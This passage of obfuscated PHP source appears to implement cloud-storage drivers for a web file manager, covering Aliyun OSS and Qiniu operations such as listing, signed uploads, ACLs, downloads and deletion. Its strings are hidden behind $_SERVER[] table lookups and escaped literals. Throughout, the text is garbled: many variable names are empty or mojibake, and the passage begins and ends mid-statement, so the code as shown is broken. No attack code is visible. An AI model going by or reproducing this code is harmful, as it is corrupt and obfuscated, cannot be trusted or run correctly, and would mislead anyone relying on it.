$[$ÙÅ©®[92]])) { $[$ÙÅ©®[92]][] = $Ÿü; } $ = $this->delByBatch($[$ÙÅ©®[93]]); if (!$) { return !1; } $ = $this->delByBatch($[$ÙÅ©®[92]]); if (!$) { return !1; } return $this->delFile($Ÿü); } private function delByBatch($»ï) { foreach (array_chunk($»ï, 1000) as $◊∑) { try { $this->client->deleteObjects($this->bucket, $◊∑); } catch (OSS\Core\OssException $Îò∑) { return !1; } } return !0; } public function rename($, $) { return $this->renameObject($, $); } private function fileInfo($, $ = false, $ = array()) { $›Å =& $_SERVER[]; $ = array($›Å[42] => $this->pathThis($), $›Å[94] => $this->getPathOuter($), $›Å[43] => $›Å[224], $›Å[86] => isset($[$›Å[86]]) ? $[$›Å[86]] : 0, $›Å[185] => $this->ext($)); if ($) { return $; } $[$›Å[225]] = $[$›Å[95]] = 0; $[$›Å[226]] = $[$›Å[227]] = !0; if (empty($)) { $ = $this->objectMeta($); if (!$) { return $; } $ = array($›Å[95] => strtotime($[$›Å[1425]]), $›Å[86] => $[$›Å[1424]] + 0, $›Å[1423] => $[$›Å[1423]]); } if (isset($[$›Å[1423]]) && $[$›Å[1423]]) { $[$›Å[229]] = trim($[$›Å[1423]], $›Å[128]); } if (isset($[$›Å[86]])) { $[$›Å[86]] = $[$›Å[86]]; } if (isset($[$›Å[95]])) { $[$›Å[95]] = $[$›Å[95]]; } if (isset($[$›Å[204]]) && !trim($[$›Å[95]])) { $[$›Å[95]] = $[$›Å[204]]; } return $; } private function folderInfo($–â, $≈æ = false, $ÊÅç = array()) { $Ëπ≤ =& $_SERVER[]; $ = array($Ëπ≤[42] => $this->pathThis($–â), $Ëπ≤[94] => $this->getPathOuter($Ëπ≤[18] . $–â), $Ëπ≤[43] => $Ëπ≤[85]); if ($≈æ) { return $; } $[$Ëπ≤[225]] = $[$Ëπ≤[95]] = 0; $[$Ëπ≤[226]] = $[$Ëπ≤[227]] = !0; if (empty($ÊÅç)) { $–â = rtrim($–â, $Ëπ≤[18]) . $Ëπ≤[18]; $ õ = $this->objectMeta($–â); if (!$ õ) { return $; } $ÊÅç = array($Ëπ≤[225] => $ õ[$Ëπ≤[553]][$Ëπ≤[1432]], $Ëπ≤[95] => strtotime($ õ[$Ëπ≤[1425]])); } if (isset($ÊÅç[$Ëπ≤[95]])) { $[$Ëπ≤[95]] = $ÊÅç[$Ëπ≤[95]]; } if (isset($ÊÅç[$Ëπ≤[225]])) { $[$Ëπ≤[225]] = $ÊÅç[$Ëπ≤[225]]; } return $; } public function listPath($, $Ÿ¥ = false) { $ £ =& $_SERVER[]; $ = $this->fileList($, $ £[18], !0); foreach ($[$ £[92]] as $ => $‹®) { $[$ £[92]][$] = $this->folderInfo($‹®, $Ÿ¥, $‹®); } foreach ($[$ £[93]] as $ => $‹®) { $[$ £[93]][$] = $this->fileInfo($‹®[$ £[42]], $Ÿ¥, $‹®); } return $; } protected function infoChildren($⁄°, &$»ÜËï´) { $ =& $_SERVER[]; $ = $this->fileList($⁄°, $[22], !0); $»ÜËï´[$[88]] += count($[$[92]]); $»ÜËï´[$[87]] += count($[$[93]]); foreach ($[$[93]] as $ÿü) { if (!$ÿü || !$ÿü[$[86]]) { continue; } $»ÜËï´[$[86]] += $ÿü[$[86]]; } } public function has($ õ, $Óîà = false, $‹ë = true) { $Ÿ™ =& $_SERVER[]; $ õ = trim($ õ, $Ÿ™[18]); $ = empty($ õ) && $ õ !== $Ÿ™[222] ? $Ÿ™[22] : $ õ . $Ÿ™[18]; $–ô = $Ÿ™[22]; $‚éõ = 500; $”é = $ = 0; while (!0) { check_abort(); $◊õ = array($Ÿ™[1419] => $Ÿ™[18], $Ÿ™[1420] => $, $Ÿ™[1421] => $‚éõ, $Ÿ™[1422] => $–ô); try { $Èπã = $this->client->listObjects($this->bucket, $◊õ); } catch (OSS\Core\OssException $) { break; } $–ô = $Èπã->getNextMarker(); $ = $Èπã->getObjectList(); $ = $Èπã->getPrefixList(); if ($Óîà) { if (count($) > 1 || count($) == 1 && $[0]->getKey() != $) { $”é += count($) - 1; } if (!empty($)) { $ += count($); } if ($–ô === $Ÿ™[22]) { break; } continue; } if ($‹ë) { if (!empty($)) { if (count($) > 1 || $[0]->getKey() != $) { return !0; } } } else { if (!empty($)) { return !0; } } if ($–ô === $Ÿ™[22]) { break; } } if ($Óîà) { return array($Ÿ™[233] => $”é, $Ÿ™[234] => $); } return !1; } public function listAll($ËêÉ) { $ÒØÇ§ =& $_SERVER[]; $œ≤ = $this->fileList($ËêÉ, $ÒØÇ§[22], !0); $Ÿû = array_to_keyvalue($œ≤[$ÒØÇ§[93]], $ÒØÇ§[42]); foreach ($œ≤[$ÒØÇ§[92]] as $) { if (is_string($)) { $Ÿû[$] = array($ÒØÇ§[86] => 0); } } return $this->listAllFiles($ËêÉ, $Ÿû); } public function canRead($ﬂΩ) { $ =& $_SERVER[]; $ËèÉ›≤ = $this->pathAcl($ﬂΩ); return $ËèÉ›≤ == $[1433] || $ËèÉ›≤ == $[596] ? !0 : !1; } public function canWrite($Ïß•) { $ﬁç = $this->pathAcl($Ïß•); return $ﬁç == $_SERVER[][596] ? !0 : !1; } public function pathAcl($) { $ =& $_SERVER[]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($)); } catch (OSS\Core\OssException $¬∑) { return !1; } $ = $ == $[47] ? $this->bucketAcl : $; if ($ == $[1434]) { return $[1433]; } if ($ == $[1435]) { return $[596]; } return $; } private function chmodPath($, $ = '') { $ =& $_SERVER[]; $⁄Ø = empty($) ? $[1435] : $; $ = array($[47], $[223], $[1434], $[1435]); if (!in_array($⁄Ø, $)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($), $⁄Ø); } catch (OSS\Core\OssException $) { return !1; } return !0; } public function getContent($) { return $this->fileSubstr($, -1); } public function setContent($«ñ, $“∂ = '') { $ =& $_SERVER[]; try { $ = $this->trafficLimit($[1436]); $À∂ = $this->client->putObject($this->bucket, $this->pathEncode($«ñ), $“∂, $); } catch (OSS\Core\OssException $◊ê) { return !1; } $ÛÑõ≠ = array($[1426] => trim($À∂[$[1423]], $[128]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($«ñ))); $this->updateObjMeta($«ñ, $ÛÑõ≠); return isset($À∂[$[1437]][$[284]]) ? !0 : !1; } private function updateObjMeta($ﬁÉ, $) { $ﬁÉ = $this->pathEncode($ﬁÉ); try { $ = array(OSS\OssClient::OSS_HEADERS => $); $this->client->copyObject($this->bucket, $ﬁÉ, $this->bucket, $ﬁÉ, $); } catch (OSS\Core\OssException $ﬂê) { return !1; } return !0; } public function upload($‘ò, $Í®Ø, $‹ó = false, $Ã® = REPEAT_REPLACE) { $ ¢ =& $_SERVER[]; $ = trim($‘ò, $ ¢[18]); $ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ ¢[1426] => @md5_file($Í®Ø)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($‘ò))); $ = $this->trafficLimit($ ¢[1436], $); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($), $Í®Ø, $); } catch (OSS\Core\OssException $ŸÆœ∫) { return !1; } return $this->getPathOuter($‘ò); } public function getHost() { $«É =& $_SERVER[]; $ = explode($«É[208], parent::getHost()); return $[0] . $«É[208] . $this->bucket . $«É[20] . $[1]; } public function uploadFormData($–∫»ù, $ = 3600) { $ =& $_SERVER[]; if (!($ = $this->getHost())) { return !1; } $ ù = $; $ = date($[1438], time() + $ ù); $Ÿé = new DateTime($); $·çî = $Ÿé->format(DateTime::ISO8601); $⁄º = strpos($·çî, $[349]); $·çî = substr($·çî, 0, $⁄º) . $[1439]; $„ì∞ = 1048576000 * 5; $ÿª = $this->pathFather($–∫»ù); $ƒå = array($[267] => $·çî, $[270] => array(array($[1440], 0, $„ì∞), array($[273], $[274], $ÿª))); $ = base64_encode(json_encode($ƒå)); $÷£ = base64_encode(hash_hmac($[256], $, $this->secret, !0)); $»ç = array($[285] => $, $[1441] => $this->accessKey, $[277] => $[266], $[1442] => $÷£, $[206] => $); $»ç = $this->trafficLimit($[1436], $»ç); return $»ç; } public function multiUploadFormData($‘ì, $‹Å›ü = 3600) { $»£…ó =& $_SERVER[]; if (!($…æ = $this->getHost())) { return !1; } $ = $this->trafficLimit($»£…ó[1436]); $ÍîÆ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($‘ì), $); return array($»£…ó[248] => $ÍîÆ, $»£…ó[206] => $…æ . $»£…ó[18] . $this->pathEncode($‘ì), $»£…ó[249] => gmdate($»£…ó[1443]), $»£…ó[104] => $‘ì); } public function multiUploadAuthData($‹†, $œú = array()) { $ =& $_SERVER[]; $”π = isset($œú[$[249]]) ? $œú[$[249]] : gmdate($[1443]); $‘ò = isset($œú[$[185]]) ? $œú[$[185]] : $[22]; $’¢ = $‹†; if (isset($œú[$[104]])) { $’¢ = $œú[$[104]]; unset($œú[$[104]]); } if (isset($œú[$[250]])) { $œú[$[249]] = $”π; return $this->listUploadParts($’¢, $œú); } $œö = array($[251], $[22], $[130], $”π, "\x78\x2d\157\x73\163\x2d\144\141\x74\x65\x3a{$”π}", $[18] . $this->bucket . $[18] . $’¢ . $‘ò); if (strpos($‘ò, $[252]) === 0) { $œö[0] = $[253]; if ($√® = $this->trafficLimit($[1436])) { $’¢ = $[1444]; array_splice($œö, 5, 0, $’¢ . $[4] . $√®[$’¢]); } } if (isset($œú[$[254]]) && $œú[$[254]] == $[255]) { $œö[0] = $[255]; } if (!empty($œú[$[1445]])) { $Õ´ = array_merge(array($œö[4]), $œú[$[1445]]); sort($Õ´); $œö[4] = implode($[11], $Õ´); } $÷î = implode($[11], $œö); $√ß = base64_encode(hash_hmac($[256], $÷î, $this->secret, !0)); $Ãö = $[1409] . $this->accessKey . $[4] . $√ß; if (strpos($‘ò, $[252]) === 0) { $Ãö = array($[258] => $Ãö, $[249] => $”π); if ($√®) { $Ãö = array_merge($Ãö, $√®); } } return $Ãö; } public function listUploadParts($€ç, $Ÿ¶) { $Ïø≥ =& $_SERVER[]; $ = parse_url_query($Ÿ¶[$Ïø≥[185]]); $ = $this->client->listParts($this->bucket, $this->pathEncode($€ç), $[$Ïø≥[248]]); $Îàõ“â = $->getListPart(); $ = array(); foreach ($Îàõ“â as $) { $[] = array($Ïø≥[1430] => $->getPartNumber(), $Ïø≥[1431] => trim($->getETag(), $Ïø≥[128])); } unset($Ÿ¶[$Ïø≥[250]], $Ÿ¶[$Ïø≥[254]]); $œπ = $this->multiUploadAuthData($€ç, $Ÿ¶); if (empty($œπ)) { return !1; } return array($Ïø≥[258] => $œπ, $Ïø≥[249] => $Ÿ¶[$Ïø≥[249]], $Ïø≥[260] => $); } public function download($ÿê, $’°Ÿá) { if ($this->isFolder($ÿê)) { return !1; } try { $ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $’°Ÿá); $ = $this->trafficLimit($_SERVER[][119], $); $this->client->getObject($this->bucket, $this->pathEncode($ÿê), $); } catch (OSS\Core\OssException $”¶) { return !1; } return $’°Ÿá; } public function fileSubstr($»∑‹Æ, $»å = 0, $≈ì = false) { if ($»å === -1) { $ÕêÂ§ª = array(); } else { if ($≈ì === !1) { $Ìéã = $this->size($»∑‹Æ); } else { $Ìéã = $»å + $≈ì - 1; } $ÕêÂ§ª = array(OSS\OssClient::OSS_RANGE => "{$»å}\55{$Ìéã}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($»∑‹Æ), $ÕêÂ§ª); } catch (OSS\Core\OssException $) { think_exception($->getMessage()); return !1; } } private function trafficLimit($, $√ñ = array()) { $…ë =& $_SERVER[]; if ($ == $…ë[1436] && $this->isUploadServer() || $ == $…ë[119] && $this->isFileOutServer()) { return $√ñ; } $ = floatval($GLOBALS[$…ë[16]][$…ë[99]][$…ë[117]][$]) * 1024 * 1024 * 8; if (!$) { return $√ñ; } $ = $ < 819200 ? 819200 : ($ > 838860800 ? 838860800 : $); $√ñ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($); return $√ñ; } public function link($—øﬂº, $›´ = array()) { $ =& $_SERVER[]; if (!$this->exist($—øﬂº) || $this->isFolder($—øﬂº)) { return !1; } try { $›´ = $this->trafficLimit($[119], $›´); $’çﬂÇ = $this->client->signUrl($this->bucket, $this->pathEncode($—øﬂº), 3600 * 12, $[255], $›´); return $this->getCdnLink($’çﬂÇ); } catch (OSS\Core\OssException $·ææ) { return !1; } } public function fileOut($’Ñ◊Ö, $…¥¬≥ = false, $ = false, $⁄´ = '') { $ =& $_SERVER[]; if ($this->isFileOutServer()) { return $this->fileOutServer($’Ñ◊Ö, $…¥¬≥, $, $⁄´); } if (!$) { $ = $this->pathThis($’Ñ◊Ö); } $ = rawurlencode($); $Ô∏¥»ë = get_file_mime(get_path_ext($)); if ($Ô∏¥»ë == $[242]) { return parent::fileOut($’Ñ◊Ö, $…¥¬≥, $, $⁄´); } $…¥¬≥ = $…¥¬≥ ? $[1446] : $[1447]; $ƒä = array(OSS\OssClient::OSS_SUB_RESOURCE => $[1448] . rawurlencode("{$…¥¬≥}\x3b\x66\x69\154\x65\156\141\155\x65\x3d{$}")); $ƒä[OSS\OssClient::OSS_SUB_RESOURCE] .= $[1449] . rawurlencode($Ô∏¥»ë); $ÿ∞ = $this->link($’Ñ◊Ö, $ƒä); $this->fileOutLink($ÿ∞); } public function fileOutServer($, $‰Öπ = false, $¬É = false, $·¨Ä = '') { parent::fileOut($, $‰Öπ, $¬É, $·¨Ä); } public function fileOutImage($œõ, $∆ä = 250) { if ($this->size($œõ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($œõ, $∆ä); } $ﬁôÒüãâ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[][1450] . $∆ä); $«µ = $this->link($œõ, $ﬁôÒüãâ); $this->fileOutLink($«µ); } public function fileOutImageServer($·ªø∆Ø, $ = 250) { parent::fileOutImage($·ªø∆Ø, $); } public function fileOutLink($) { $Íøâ =& $_SERVER[]; if (!$this->isCdnHost() && substr($, 0, 7) == $Íøâ[1371]) { $ = $Íøâ[1372] . substr($, 7); } header($Íøâ[172] . $); die; } public function hashMd5($À∂, $ÁÄ® = '') { $Ãß =& $_SERVER[]; $ = $this->_objectMeta($À∂); if (!$) { return $Ãß[22]; } if (!isset($[$Ãß[1426]]) && !empty($ÁÄ®)) { $€éƒô = $this->updateObjMeta($À∂, array($Ãß[1426] => $ÁÄ®)); $[$Ãß[1426]] = $€éƒô ? $ÁÄ® : $Ãß[22]; } return isset($[$Ãß[1426]]) ? strtolower($[$Ãß[1426]]) : $Ãß[22]; } public function size($⁄Ä) { $ = $this->objectMeta($⁄Ä); return $ ? $[$_SERVER[][86]] : 0; } public function info($“ä) { if ($this->isFolder($“ä)) { return $this->folderInfo($“ä); } else { if ($this->isFile($“ä)) { return $this->fileInfo($“ä); } } return !1; } public function exist($Œå) { return $this->isFile($Œå) || $this->isFolder($Œå); } public function isFile($”ç) { return !$this->isFolder($”ç) && $this->objectMeta($”ç); } public function isFolder($√ìŒ∑) { return $this->cacheMethod($_SERVER[][176], $√ìŒ∑); } protected function objectMeta($“Ä) { return $this->cacheMethod($_SERVER[][178], $“Ä); } protected function _objectMeta($) { $…º =& $_SERVER[]; try { $ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($)); } catch (OSS\Core\OssException $Õß–æ) { $ = !1; } if ($) { $[$…º[86]] = intval($[$…º[1424]]); } return $; } protected function _isFolder($) { $ =& $_SERVER[]; if ($ == $[22] || $ == $[18]) { return !0; } $Ò£∫ê = array($[1419] => $[18], $[1420] => rtrim($, $[18]) . $[18], $[1421] => 1, $[1422] => $[22]); $ = $this->client->listObjects($this->bucket, $Ò£∫ê); if ($->getObjectList() || $->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($Àê) { parent::__construct(); require_once SDK_DIR . $_SERVER[][1451]; $this->_init($Àê); } public function _init($√É) { $„≥Ä =& $_SERVER[]; $this->config = $√É; foreach ($√É as $ﬁÆ => $ﬂë‘•) { if (isset($this->{$ﬁÆ})) { $this->{$ﬁÆ} = $ﬂë‘•; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($„≥Ä[1452] . LNG($„≥Ä[1410])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ÿÑ, $—´ = '', $ = REPEAT_RENAME) { if ($this->setContent($ÿÑ, $—´)) { return $this->getPathOuter($ÿÑ); } return !1; } public function mkdir($ÈÇü›Æ, $‘Ω = REPEAT_SKIP) { $Àé =& $_SERVER[]; $Î†¨ = trim($ÈÇü›Æ, $Àé[18]); if ($this->_isFolder($Î†¨)) { return $this->getPathOuter($Î†¨); } $ÈÇü›Æ = $Î†¨ . $Àé[18]; $ = get_path_this($Î†¨); $«´‰®≤ = $ÈÇü›Æ . $; if (!$this->mkfile($«´‰®≤)) { return !1; } if (!$this->moveFile($«´‰®≤, $ÈÇü›Æ)) { $this->delFile($«´‰®≤); return !1; } return $this->getPathOuter($Î†¨); } public function copyFile($, $Ííµ) { $—ì = $this->bucketManager->copy($this->bucket, $, $this->bucket, $Ííµ, !0); return $—ì ? !1 : $this->getPathOuter($Ííµ); } public function moveFile($–æ, $√§) { $‘ã = $this->bucketManager->move($this->bucket, $–æ, $this->bucket, $√§, !0); return $‘ã ? !1 : $this->getPathOuter($√§); } public function delFile($Ôõà) { if (!$this->exist($Ôõà)) { return !0; } $Óàè‘ï = $this->bucketManager->delete($this->bucket, $Ôõà); return $Óàè‘ï ? !1 : !0; } public function delFolder($ÀÆ√≤) { $ =& $_SERVER[]; if (!$this->exist($ÀÆ√≤)) { return !0; } $this->listItemCache = !1; $ = $this->fileList($ÀÆ√≤); $this->listItemCache = !0; $Â±ì = trim($ÀÆ√≤, $[18]) . $[18]; if (!empty($ÀÆ√≤) && $ÀÆ√≤ !== $[222] && !in_array($Â±ì, $[$[92]])) { $[$[92]][] = $Â±ì; } $›¶ = $this->delByBatch($[$[93]]); if (!$›¶) { return !1; } $›¶ = $this->delByBatch($[$[92]]); if (!$›¶) { return !1; } return $this->delFile($Â±ì); } private function delByBatch($÷Ö) { foreach (array_chunk($÷Ö, 1000) as $…Ü) { $“¥ = $this->bucketManager->buildBatchDelete($this->bucket, $…Ü); list($, $) = $this->bucketManager->batch($“¥); if ($) { return !1; } } return !0; } public function rename($◊∂√º, $) { return $this->renameObject($◊∂√º, $); } public function fileInfo($·àª, $Œë = false, $ = array()) { $ =& $_SERVER[]; $ﬂ¢ = array($[42] => $this->pathThis($·àª), $[94] => $this->getPathOuter($[18] . $·àª), $[43] => $[224], $[86] => isset($[$[1453]]) ? $[$[1453]] : 0, $[185] => $this->ext($·àª)); if ($Œë) { return $ﬂ¢; } $ﬂ¢[$[225]] = $ﬂ¢[$[95]] = 0; $ﬂ¢[$[226]] = $ﬂ¢[$[227]] = !0; if (empty($)) { $ = $this->objectMeta($·àª); if (!$) { return $ﬂ¢; } } if (isset($[$[228]]) && $[$[228]]) { $ﬂ¢[$[229]] = $[$[228]]; } if (isset($[$[238]]) && $[$[238]]) { $ﬂ¢[$[229]] = $[$[238]]; } if (isset($[$[1454]])) { $ﬂ¢[$[95]] = substr($[$[1454]] . $[22], 0, 10); } if (isset($[$[1453]])) { $ﬂ¢[$[86]] = $[$[1453]]; } return $ﬂ¢; } public function folderInfo($œà, $‹éË®û = false) { $€ô =& $_SERVER[]; $ = array($€ô[42] => $this->pathThis($œà), $€ô[94] => $this->getPathOuter($€ô[18] . $œà), $€ô[43] => $€ô[85]); if ($‹éË®û) { return $; } $[$€ô[225]] = $[$€ô[95]] = 0; $[$€ô[226]] = $[$€ô[227]] = !0; $œà = rtrim($œà, $€ô[18]) . $€ô[18]; $‹ó = $this->objectMeta($œà); if (isset($‹ó[$€ô[1454]])) { $[$€ô[95]] = substr($‹ó[$€ô[1454]] . $€ô[22], 0, 10); } return $; } public function listPath($ ëÏ≤ê, $—∫ = false) { $ÿ¥ =& $_SERVER[]; $∆ì = $this->fileList($ ëÏ≤ê, $ÿ¥[18], !0); foreach ($∆ì[$ÿ¥[92]] as $ƒÜ => $‹®) { $∆ì[$ÿ¥[92]][$ƒÜ] = $this->folderInfo($‹®, $—∫); } foreach ($∆ì[$ÿ¥[93]] as $ƒÜ => $‹®) { $∆ì[$ÿ¥[93]][$ƒÜ] = $this->fileInfo($‹®[$ÿ¥[104]], $—∫, $‹®); } return $∆ì; } public function has($„≠®Ëºù, $ = false, $ = true) { $“ñ =& $_SERVER[]; $„≠®Ëºù = trim($„≠®Ëºù, $“ñ[18]); $ = empty($„≠®Ëºù) && $„≠®Ëºù !== $“ñ[222] ? $“ñ[22] : $„≠®Ëºù . $“ñ[18]; $÷≤ = $“ñ[22]; $ = 500; $ÃÉ = $“ñ[18]; $ = $ = 0; while (!0) { check_abort(); list($Ô≤≠, $Â´Ø) = $this->bucketManager->listFiles($this->bucket, $, $÷≤, $, $ÃÉ); if ($Â´Ø) { break; } $÷≤ = array_key_exists($“ñ[1422], $Ô≤≠) ? $÷≤ = $Ô≤≠[$“ñ[1455]] : $“ñ[22]; if ($) { if (!empty($Ô≤≠[$“ñ[1456]])) { $ += count($Ô≤≠[$“ñ[1456]]); } if (!empty($Ô≤≠[$“ñ[1457]])) { $ += count($Ô≤≠[$“ñ[1457]]); } if ($÷≤ === $“ñ[22]) { break; } continue; } if ($) { if (!empty($Ô≤≠[$“ñ[1456]])) { return !0; } } else { if (!empty($Ô≤≠[$“ñ[1457]])) { return !0; } } if ($÷≤ === $“ñ[22]) { break; } } if ($) { return array($“ñ[233] => $, $“ñ[234] => $); } return !1; } public function listAll($) { $«ä =& $_SERVER[]; $Ã¶ = $this->fileList($, $«ä[22], !0); $”ä = array_to_keyvalue($Ã¶[$«ä[93]], $«ä[42]); foreach ($Ã¶[$«ä[92]] as $ÕÖ) { if (is_string($ÕÖ)) { $”ä[$ÕÖ] = array($«ä[86] => 0); } } return $this->listAllFiles($, $”ä); } private function fileList($≈Ü, $Œ± = '', $ = 0) { $ =& $_SERVER[]; $≈Ü = trim($≈Ü, $[18]); $ = empty($≈Ü) && $≈Ü !== $[222] ? $[22] : $≈Ü . $[18]; $ÛòîÄ = $[22]; $„ú¢ = 1000; $ÈûÖ = $ = array(); while (!0) { check_abort(); list($Èãì, $) = $this->bucketManager->listFiles($this->bucket, $, $ÛòîÄ, $„ú¢, $Œ±); if ($) { break; } $ÛòîÄ = array_key_exists($[1422], $Èãì) ? $ÛòîÄ = $Èãì[$[1455]] : $[22]; $Œ∞ﬂ∏ = isset($Èãì[$[1456]]) ? $Èãì[$[1456]] : array(); $ÿã = isset($Èãì[$[1457]]) ? $Èãì[$[1457]] : array(); foreach ($Œ∞ﬂ∏ as $ÀØﬂª) { if ($ÀØﬂª[$[104]] == $) { continue; } $”Ö = $ÀØﬂª[$[104]]; $ = $ÀØﬂª[$[1453]]; $ÀØﬂª[$[86]] = $; $ = $ == 0 && substr($”Ö, strlen($”Ö) - 1, 1) == $[18] ? !0 : !1; $this->cacheMethodInfoSet($”Ö, $, $ÀØﬂª); if ($) { $ÈûÖ[] = $”Ö; continue; } $[] = $ ? $ÀØﬂª : $”Ö; } foreach ($ÿã as $”Ö) { if ($”Ö == $) { continue; } $ÈûÖ[] = $”Ö; $this->cacheMethodInfoSet($”Ö, !0); } if ($ÛòîÄ === $[22]) { break; } } $this->cacheMethodInfoSet($≈Ü, !0); return array($[92] => $ÈûÖ, $[93] => $); } public function canRead($’Ω–π) { return $this->exist($’Ω–π) ? !0 : !1; } public function canWrite($«ûÃà) { return $this->exist($«ûÃà) ? !0 : !1; } public function getContent($) { return $this->fileSubstr($, 0, -1); } public function setContent($, $ = '') { $ = $this->tempFile($this->pathThis($)); file_put_contents($, $); if ($this->upload($, $)) { $this->tempFileRemve($); return !0; } return !1; } public function refreshUrls($) { $Íπë =& $_SERVER[]; $÷ò = array(); if (is_array($)) { foreach ($ as $…¢) { $÷ò[] = $this->link($…¢); } } else { $÷ò[] = $this->link($); } $◊ô = new Qiniu\Cdn\CdnManager($this->auth); list($, $) = $◊ô->refreshUrls($÷ò); if ($) { return !1; } return $[$Íπë[1223]] == $Íπë[799] ? !0 : !1; } public function fileSubstr($◊ä, $„ñµ, $) { $∆∏ =& $_SERVER[]; if (!($¬ñ = $this->link($◊ä))) { return !1; } $Ìç∂ = !1; if ($ > 0) { $ƒ† = $„ñµ + $ - 1; $Ìç∂ = array($∆∏[1458] . $„ñµ . $∆∏[439] . $ƒ†); } $¬¥ = url_request($¬ñ, $∆∏[255], !1, $Ìç∂); return $¬¥[$∆∏[790]] ? $¬¥[$∆∏[1243]] : !1; } public function upload($Àè, $, $⁄Ñ›ø = false, $»Ö = REPEAT_REPLACE) { $–â = new Qiniu\Storage\UploadManager(); $·à≠ = $this->auth->uploadToken($this->bucket, $Àè); $À™ = get_file_mime(get_path_ext($)); list($‘≠, $”Ö) = $–â->putFile($·à≠, $Àè, $, null, $À™); return $”Ö ? !1 : $this->getPathOuter($Àè); } public function uploadFormData($√ã, $ = 3600) { return $this->uploadToken($√ã, $); } public function multiUploadFormData($, $‚ÜÜ = 3600) { return $this->uploadToken($, $‚ÜÜ); } private function uploadToken($‘ëﬁé, $Ÿã = 3600) { $√õœè =& $_SERVER[]; $ÿã = $Ÿã; $ = array($√õœè[1459] => $√õœè[1460]); $ = $‘ëﬁé; $ = $this->auth->uploadToken($this->bucket, $, $ÿã, $, !0); $ = empty($this->region) || $this->region == $√õœè[1461] ? $√õœè[22] : $√õœè[439] . $this->region; $Ã± = http_type() . "\72\x2f\57\x75\x70\154\157\x61\x64{$}\56\x71\151\156\x69\165\160\56\143\157\155\x2f"; return array($√õœè[1462] => $, $√õœè[1463] => $Ã±); } public function download($›†, $Ìíº) { $ = IO::getPathInner(IO::mkfile($Ìíº)); if (!($ﬁ§ = $this->link($›†))) { return !1; } $ = 0; $⁄° = 1024 * 200; $‘î = fopen($, $_SERVER[][1464]); while (!0) { $«æ = $this->fileSubstr($›†, $, $⁄°); if ($«æ === !1) { return !1; } fwrite($‘î, $«æ); $ += $⁄°; if (strlen($«æ) < $⁄°) { break; } } fclose($‘î); return $Ìíº; } public function link($ÀÇ, $ÍÉ∂ = '') { if (!$this->isFile($ÀÇ)) { return !1; } $÷ì‹° = $this->getHost() . $_SERVER[][18] . $this->pathEncode($ÀÇ) . $ÍÉ∂; return $this->auth->privateDownloadUrl($÷ì‹°, 3600 * 12); } public function fileOut($, $œ•ÔëÆ = false, $ = false, $—í = '') { $–≥ =& $_SERVER[]; if ($this->isFileOutServer()) { return $this->fileOutServer($, $œ•ÔëÆ, $, $—í); } if (!$) { $ = $this->pathThis($); } $ = $œ•ÔëÆ ? $–≥[1465] . rawurlencode($) : $–≥[22]; $ = $this->link($, $); $this->fileOutLink($); } public function fileOutServer($, $ = false, $‘é = false, $ƒ• = '') { parent::fileOut($, $, $‘é, $ƒ•); } public function fileOutImage($ﬁñ, $ = 250) { $ = $this->link($ﬁñ, $_SERVER[][1466] . $); $this->fileOutLink($); } public function fileOutImageServer($Õ™, $ﬂ¢ = 250) { parent::fileOutImage($Õ™, $ﬂ¢); } public function hashMd5($ƒÅ) { $ÿú =& $_SERVER[]; $ƒ¢ = $this->objectMeta($ƒÅ); return isset($ƒ¢[$ÿú[238]]) ? $ƒ¢[$ÿú[238]] : !1; $Ÿí = $this->link($ƒÅ, $ÿú[1467]); } public function size($) { $Ÿ¨ = $this->objectMeta($); return $Ÿ¨ ? $Ÿ¨[$_SERVER[][86]] : 0; } public function info($) { if ($this->isFolder($)) { return $this->folderInfo($); } else { if ($this->isFile($)) { return $this->fileInfo($); } } return !1; } public function exist($ÿ•) { return $this->isFile($ÿ•) || $this->isFolder($ÿ•); } public function isFile($Õ¨) { return !$this->isFolder($Õ¨) && $this->objectMeta($Õ¨); } public function isFolder($Ââ¨) { return $this->cacheMethod($_SERVER[][176], $Ââ¨); } protected function objectMeta($—Ø) { return $this->cacheMethod($_SERVER[][178], $—Ø); } protected function _objectMeta($…´) { $ =& $_SERVER[]; list($»Å, $) = $this->bucketManager->stat($this->bucket, $…´); if ($»Å) { $»Å[$[86]] = intval($»Å[$[1453]]); } return $»Å; } protected function _isFolder($ƒΩ) { $ =& $_SERVER[]; if ($ƒΩ == $[22] || $ƒΩ == $[18]) { return !0; } list($, $ÏüÜ) = $this->bucketManager->listFiles($this->bucket, trim($ƒΩ, $[18]) . $[18], $[22], 1, $[18]); return !empty($[$[1456]]) || !empty($[$[1457]]) ? !0 : !1; } } goto dÌç´; d‚èΩ: class PathDriverDbShareItem extends PathDriverDB { public function __construct($—¨) { $this->pathParse = $—¨; $this->model = Model($_SERVER[][1373]); } public function getPathOuter($ ê) { $ﬂê =& $_SERVER[]; if (!$ ê) { return $ ê; } $ = $this->parse($ ê); return trim(KodIO::makeShare($this->pathParse[$ﬂê[452]], $[$ﬂê[452]]), $ﬂê[18]); } protected function infoParse($÷ã, $ = false, $ = false) { 